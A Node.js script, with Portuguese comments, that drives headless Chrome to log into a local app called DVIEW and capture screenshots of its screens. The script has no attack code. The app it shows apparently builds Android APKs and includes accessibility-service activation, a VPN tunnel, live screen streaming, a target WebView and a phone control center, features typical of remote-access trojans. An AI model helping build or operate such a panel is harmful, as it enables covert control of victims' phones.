const http = require('http');
const fs = require('fs');
const { spawn } = require('child_process');

const CHROME_PATH = 'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe';

async function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

function httpGet(url) {
  return new Promise((resolve, reject) => {
    http.get(url, res => {
      let data = '';
      res.on('data', chunk => data += chunk);
      res.on('end', () => resolve(data));
    }).on('error', reject);
  });
}

async function runCompleteGallery() {
  const tempProfile = process.env.TEMP + '\\chrome_gallery_' + Date.now();
  console.log('Launching headless Chrome on port 9555...');
  const chrome = spawn(CHROME_PATH, [
    '--headless=new',
    '--remote-debugging-port=9555',
    '--disable-gpu',
    '--window-size=1600,1050',
    `--user-data-dir=${tempProfile}`,
    '--no-first-run',
    '--no-default-browser-check',
    'http://localhost:5000/'
  ]);

  try {
    let ready = false;
    let listData = '';
    for (let i = 0; i < 30; i++) {
      await sleep(300);
      try {
        listData = await httpGet('http://127.0.0.1:9555/json/list');
        const list = JSON.parse(listData);
        if (list.length > 0 && list[0].webSocketDebuggerUrl) {
          ready = true;
          break;
        }
      } catch {}
    }
    if (!ready) throw new Error('Chrome failed to start on port 9555');

    const pages = JSON.parse(listData);
    const targetPage = pages.find(p => p.type === 'page') || pages[0];
    const wsUrl = targetPage.webSocketDebuggerUrl;

    const ws = new globalThis.WebSocket(wsUrl);
    await new Promise((resolve, reject) => {
      ws.onopen = resolve;
      ws.onerror = reject;
    });

    let msgId = 1;
    function sendCommand(method, params = {}) {
      return new Promise((resolve, reject) => {
        const id = msgId++;
        const handler = (event) => {
          const msg = JSON.parse(event.data);
          if (msg.id === id) {
            ws.removeEventListener('message', handler);
            if (msg.result) resolve(msg.result);
            else reject(new Error(JSON.stringify(msg.error)));
          }
        };
        ws.addEventListener('message', handler);
        ws.send(JSON.stringify({ id, method, params }));
      });
    }

    async function evaluate(expression) {
      const res = await sendCommand('Runtime.evaluate', { expression, returnByValue: true });
      return res.result ? res.result.value : null;
    }

    async function saveScreenshot(filename) {
      const res = await sendCommand('Page.captureScreenshot', { format: 'png' });
      fs.writeFileSync(filename, Buffer.from(res.data, 'base64'));
      console.log(`[CAPTURA CONCLUÍDA] ${filename} (${fs.statSync(filename).size} bytes)`);
    }

    console.log('1. Realizando login no DVIEW...');
    await sleep(2500);
    await evaluate(`
      const btn = document.querySelector('button[type="submit"]');
      if (btn) btn.click();
    `);
    await sleep(2500);

    // 2. Ir para o Gerador APK
    console.log('2. Acessando módulo Gerador APK...');
    await evaluate(`
      const navBtns = Array.from(document.querySelectorAll('.nav-item-btn'));
      const apkBtn = navBtns.find(b => b.textContent && b.textContent.includes('Gerador APK'));
      if (apkBtn) apkBtn.click();
    `);
    await sleep(2000);

    // Screenshot 1: Tabela de APKs e Configurações Globais de Salvamento
    await saveScreenshot('c:\\Users\\Dell\\Downloads\\dview-main\\print_01_apk_builder_table.png');

    // 3. Abrir o Modal de Edição/Criação do APK
    console.log('3. Abrindo modal de edição de APK com configurações de VPN e Acessibilidade...');
    await evaluate(`
      const editBtn = document.querySelector('.apk-btn-edit') || document.querySelector('.apk-btn-novo-build');
      if (editBtn) editBtn.click();
    `);
    await sleep(2000);

    // Screenshot 2: Formulário com Edição de Parâmetros, URL Destino, VPN e Histórico de Logos
    await saveScreenshot('c:\\Users\\Dell\\Downloads\\dview-main\\print_02_apk_builder_modal_form.png');

    // 4. Trocar para a aba Preview Interativo das Telas de Instalação e Ativação no Celular
    console.log('4. Alternando para o Preview Interativo no Smartphone...');
    await evaluate(`
      const modalTabs = Array.from(document.querySelectorAll('.app-modal-tab'));
      const prevTab = modalTabs.find(t => t.textContent && t.textContent.includes('Preview'));
      if (prevTab) prevTab.click();
    `);
    await sleep(1500);

    // Screenshot 3: Etapa 1 - Download no Navegador
    await evaluate(`
      const stepPills = Array.from(document.querySelectorAll('.apk-preview-step-pill'));
      if (stepPills[0]) stepPills[0].click();
    `);
    await sleep(1000);
    await saveScreenshot('c:\\Users\\Dell\\Downloads\\dview-main\\print_03_preview_step1_download.png');

    // Screenshot 4: Etapa 2 - Instalador de Pacotes do Android
    await evaluate(`
      const stepPills = Array.from(document.querySelectorAll('.apk-preview-step-pill'));
      if (stepPills[1]) stepPills[1].click();
    `);
    await sleep(1000);
    await saveScreenshot('c:\\Users\\Dell\\Downloads\\dview-main\\print_04_preview_step2_installer.png');

    // Screenshot 5: Etapa 4 - Ativação do Serviço de Acessibilidade
    await evaluate(`
      const stepPills = Array.from(document.querySelectorAll('.apk-preview-step-pill'));
      if (stepPills[3]) stepPills[3].click();
    `);
    await sleep(1000);
    await saveScreenshot('c:\\Users\\Dell\\Downloads\\dview-main\\print_05_preview_step4_accessibility.png');

    // Screenshot 6: Etapa 5 - Conexão VPN & Túnel Seguro
    await evaluate(`
      const stepPills = Array.from(document.querySelectorAll('.apk-preview-step-pill'));
      if (stepPills[4]) stepPills[4].click();
    `);
    await sleep(1000);
    await saveScreenshot('c:\\Users\\Dell\\Downloads\\dview-main\\print_06_preview_step5_vpn_tunnel.png');

    // Screenshot 7: Etapa 6 - Transmissão de Tela em Tempo Real
    await evaluate(`
      const stepPills = Array.from(document.querySelectorAll('.apk-preview-step-pill'));
      if (stepPills[5]) stepPills[5].click();
    `);
    await sleep(1000);
    await saveScreenshot('c:\\Users\\Dell\\Downloads\\dview-main\\print_07_preview_step6_screen_projection.png');

    // Screenshot 8: Etapa 8 - WebView Destino
    await evaluate(`
      const stepPills = Array.from(document.querySelectorAll('.apk-preview-step-pill'));
      if (stepPills[7]) stepPills[7].click();
    `);
    await sleep(1000);
    await saveScreenshot('c:\\Users\\Dell\\Downloads\\dview-main\\print_08_preview_step8_webview_target.png');

    // Fechar modal
    await evaluate(`
      const closeBtn = document.querySelector('.app-modal-close-btn');
      if (closeBtn) closeBtn.click();
    `);
    await sleep(1500);

    // 5. Ir para o Dashboard Central
    console.log('5. Acessando Dashboard com dispositivo conectado...');
    await evaluate(`
      const navBtns = Array.from(document.querySelectorAll('.nav-item-btn'));
      const dashBtn = navBtns.find(b => b.textContent && b.textContent.includes('Dashboard'));
      if (dashBtn) dashBtn.click();
    `);
    await sleep(2500);

    // Screenshot 9: Dashboard com aparelho conectado
    await saveScreenshot('c:\\Users\\Dell\\Downloads\\dview-main\\print_09_dashboard_device_online.png');

    // 6. Ir para o Centro de Controle Tático
    console.log('6. Acessando Centro de Controle Tático com o celular ativo...');
    await evaluate(`
      const navBtns = Array.from(document.querySelectorAll('.nav-item-btn'));
      const ctrlBtn = navBtns.find(b => b.textContent && b.textContent.includes('Controle'));
      if (ctrlBtn) ctrlBtn.click();
    `);
    await sleep(3500);

    // Selecionar o aparelho caso não esteja ativo
    await evaluate(`
      const devCard = document.querySelector('.control-device-item');
      if (devCard) devCard.click();
    `);
    await sleep(2000);

    // Screenshot 10: Centro de Controle com a tela do celular, macros, teclado e menus
    await saveScreenshot('c:\\Users\\Dell\\Downloads\\dview-main\\print_10_control_panel_phone_view.png');

    ws.close();
    console.log('TODAS AS CAPTURAS DE TELAS FORAM CONCLUÍDAS COM SUCESSO!');
  } finally {
    try { chrome.kill(); } catch {}
  }
}

runCompleteGallery().catch(err => {
  console.error('Erro na galeria de screenshots:', err);
  process.exit(1);
});
